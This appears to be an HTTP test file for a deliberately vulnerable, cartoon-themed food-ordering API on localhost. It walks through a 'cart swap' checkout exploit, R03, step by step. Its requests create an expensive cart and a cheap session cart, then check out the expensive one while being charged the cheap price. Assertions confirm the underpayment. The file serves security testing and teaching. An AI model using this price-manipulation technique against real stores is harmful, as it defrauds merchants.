# @import ../_imports.http

# Force v302 API version regardless of test execution order
# (workaround for uctest VERSION caching bug)
@host = http://localhost:8000/api/v302

# =============================================================================
# VULNERABILITY: R03 Cart Swap Checkout (session vs path confusion)
# =============================================================================
#
# DESCRIPTION:
#   resolve_trusted_cart() prefers session cart over path cart.
#   The charge_customer_with_hold decorator charges for the session cart,
#   but checkout_cart resolves the cart again and might get a different cart!
#
# ATTACK SCENARIO:
#   Karen (using her own account) exploits this by:
#   1. Creating an expensive cart WITHOUT session (Basic Auth only)
#   2. Logging in to establish a session
#   3. Creating a cheap cart (stored in session)
#   4. Checking out the EXPENSIVE cart via path, but paying for CHEAP session cart
#
# IMPACT:
#   Price manipulation - customer receives expensive items but pays cheap price.
#
# STATUS: VULNERABLE in v302 (exploit succeeds)
# =============================================================================

# =============================================================================
# SETUP: Get menu item prices
# =============================================================================

### Get menu items for price reference
# @name seed
{{
  // Use karen (Plankton's wife) to avoid cookie pollution from other tests
  await platform.seed({
    karen: 200
  });
}}
# @ucskip
# @tag cart, r03, v302, vulnerable
GET /menu

@krabby_patty_id = {{$(response).find(i => i.name === "Krabby Patty").id}}
@krabby_patty_price = {{$(response).find(i => i.name === "Krabby Patty").price}}
@ultimate_feast_id = {{$(response).find(i => i.name === "Ultimate Krabby Feast").id}}
@ultimate_feast_price = {{$(response).find(i => i.name === "Ultimate Krabby Feast").price}}

# =============================================================================
# STEP 1: Create EXPENSIVE cart (no session - Basic Auth only)
# The key is to NOT have a session cookie when creating this cart!
# =============================================================================

### Create expensive cart without session (using Basic Auth only)
# @name expensive_cart
# @forceRef seed
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
POST /cart?restaurant_id=1
Authorization: {{auth.basic("karen")}}

@expensive_cart_id = {{$(response).field("cart_id")}}
?? js $(response).status() == 201

### Add expensive item to expensive cart
# @name expensive_cart_with_item
# @forceRef expensive_cart
# @ucskip endpoint
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
POST /cart/{{expensive_cart_id}}/items
Authorization: {{auth.basic("karen")}}
Content-Type: application/json

{ "item_id": "{{ultimate_feast_id}}" }

?? js $(response).isOk() == true

# =============================================================================
# STEP 2: Login and create CHEAP cart (WITH session)
# =============================================================================

### Login to establish session
# @name login
# @forceRef expensive_cart_with_item
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
POST /auth/login
Content-Type: application/json

{ "email": "karen@chum-bucket.sea", "password": "01001011" }

@session = {{extractCookie(response)}}
?? js $(response).status() == 200

### Create cheap cart (session stores cart_id)
# @name cheap_cart
# @forceRef login
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
POST /cart?restaurant_id=1
Cookie: {{session}}

# Server updates session with cart_id - capture updated cookie if present
@session = {{hasCookie(response) ? extractCookie(response) : session}}
@cheap_cart_id = {{$(response).field("cart_id")}}
?? js $(response).status() == 201

### Add cheap item to cheap cart
# @name cheap_cart_with_item
# @forceRef cheap_cart
# @ucskip endpoint
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
POST /cart/{{cheap_cart_id}}/items
Cookie: {{session}}
Content-Type: application/json

{ "item_id": "{{krabby_patty_id}}" }

?? js $(response).isOk() == true

# =============================================================================
# EXPLOIT: Checkout EXPENSIVE cart path with CHEAP session cart
# =============================================================================

### Path says expensive cart, session has cheap cart
# charge_customer_with_hold charges for session cart (cheap)
# but checkout_cart creates order from path cart (expensive)
# @name exploit_checkout
# @forceRef cheap_cart_with_item
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
POST /cart/{{expensive_cart_id}}/checkout
Cookie: {{session}}
Content-Type: application/json

{ "tip": 0, "delivery_address": "Chum Bucket" }

@order_id = {{$(response).field("order_id")}}
@order_total = {{$(response).field("total")}}
?? js $(response).status() == 201

# =============================================================================
# IMPACT: Verify received expensive items, paid cheap price
# =============================================================================

### Received EXPENSIVE items (Ultimate Krabby Feast) but paid CHEAP price
# @forceRef exploit_checkout
# @ucskip
# @no-cookie-jar
# @tag cart, r03, v302, vulnerable
GET /orders
Cookie: {{session}}

?? js $(response).last().order_id == {{order_id}}
?? js $(response).last().items.length == 1
?? js $(response).last().items[0].item_id == {{ultimate_feast_id}}
?? js $(response).last().items[0].name == Ultimate Krabby Feast
# VULNERABILITY PROOF: Order total is the CHEAP price (~8.99), NOT expensive (~32.99)
# This proves the session cart was charged instead of the path cart
?? js parseFloat($(response).last().total) < 27.99

